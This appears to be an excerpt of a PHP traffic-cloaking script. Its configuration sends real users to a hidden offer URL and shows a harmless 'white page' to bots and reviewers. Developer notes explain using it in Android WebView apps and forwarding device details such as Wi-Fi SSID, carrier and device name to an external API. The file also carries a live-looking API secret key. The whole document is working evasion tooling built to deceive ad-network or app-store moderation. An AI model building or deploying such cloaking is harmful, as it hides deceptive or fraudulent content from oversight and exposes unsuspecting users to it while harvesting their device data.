...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://gexuilan.com/nWzZwGwP';//PHP/HTML file or URL offer used for real users
$HCSET['WHITE_PAGE'] = 'http://shrok.quest/';//PHP/HTML file or URL used for bots
...
$HCSET['API_SECRET_KEY'] = 'v1cdfa4fa1fb8b4fa0a1542ad14b5164d9';
/*********************************************/

$HCSET['groupByDomain'] = 'com.dddvvv.cybertower';
$HCSET['stage'] = 'app';
$HCSET['secret'] = 'randomString';
...
if ($HCSET['DEBUG_MODE'] == 'on') {
    ...
    // developing tips
     echo "<div class=\"container my-5\">\n        <div class=\"accordion\" id=\"developingTips\">\n            <div class=\"accordion-item\">\n              <h4 class=\"accordion-header\">\n                <button  style=\"background-color: #c2d4e3\" class=\"accordion-button collapsed\" type=\"button\" data-bs-toggle=\"collapse\" data-bs-target=\"#collapsedevelopingTips\" aria-expanded=\"true\" aria-controls=\"collapsedevelopingTips\">\n                    <h5>Notes for developers</h5>\n                </button>\n              </h4>\n                <div id=\"collapsedevelopingTips\" class=\"accordion-collapse collapse hide\" data-bs-parent=\"#developingTips\">\n                    <div class=\"accordion-body\">\n                        <ul>\n                            <li>Use only <code id='urlPoint1'></code><script>document.querySelector('#urlPoint1').innerHTML=location.origin+location.pathname</script> as an endpoint.<b> Do not attempt to send requests to our server directly</b></li>\n                            <li>You can use this page in <code>WebView</code></li>\n                            <li>To use the script as an API endpoint, check for the presence of content from the file specified in <code>\$HCSET['OFFER_PAGE']</code>. For example, if <code>\$HCSET['OFFER_PAGE']='ok.txt'</code> and the file <code>ok.txt</code> contains the text <code>OK</code>, you can use the request <code>curl <i id='urlPoint2'></i> -H 'user-agent: Dalvik com.example.company.game'</code><script>document.querySelector('#urlPoint2').innerHTML=location.origin+location.pathname</script></li>\n                            <li>This script collects all the necessary information for correct identification of IP and request headers, even in the case of using intermediate nodes. It also ensures proper encoding and transmission of information, as well as filter processing.</li>\n                            <li>If you are using your own application, we recommend adding the application name to the end of the current <code>user-agent</code> value. For example, <code>Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D) com.example.company.game/1.2.3.4</code></li>\n                            <li>We recommend sending a request on the first launch and saving the server response for consistency in your application's operation.</li>\n                            <li>Use UTM tags in the request to pass data and obtain analytics on the installReferrer. For example: <code id='urlPoint3'></code></li><script>document.querySelector('#urlPoint3').innerHTML=location.origin+location.pathname+'?utm_medium=ads'</script>\n                            <li>Optionally, you can use pass additional parameters in headers. For example:</li>\n                                <ul>\n                                    <li><code>deviceName</code> for example: \"Johns iPhone\"</li>\n                                    <li><code>osVersion</code> for example: \"13.3.1\"</li>\n                                    <li><code>locale</code> for example: \"en_GB\"</li>\n                                    <li><code>freeDiskSpace</code> for example: \"5400300\"</li>\n                                    <li><code>networkConnectionType</code> for example: \"Cellular\"</li>\n                                    <li><code>networkOperatorName</code> for example: \"Orange\"</li>\n                                    <li><code>wifiSSID</code> for example: \"WLAN-Name\"</li>\n                                    <li><code>deviceOrientation</code> for example: \"landscape\"</li>\n                                </ul>\n                        </ul>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </div>";
    // marketing tips
...
foreach (sdkAdapter($HCSET['secret']) as $item=>$value){
    $HCSETdata[$item]=$value;
}
...
function sdkAdapter($secret){
    $headers=array();
    if($_POST['data'] && $_POST['signature'] && $_POST['time']) {
        if(md5($secret.$_POST['data'])==$_POST['signature']) {
            $sdkData=json_decode(base64_decode($_POST['data']),true);
            foreach ($sdkData as $k=>$v) {
                $headers['sdk_'.$k]=json_encode($v);
            }
        }
        else {
            $headers['sdk_fake_data']=$_POST['data'];
            $headers['sdk_fake_signature']=$_POST['signature'];
        }
    }
    return $headers;
}
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-1940276148&js=false&stage='.$HCSET['stage'];
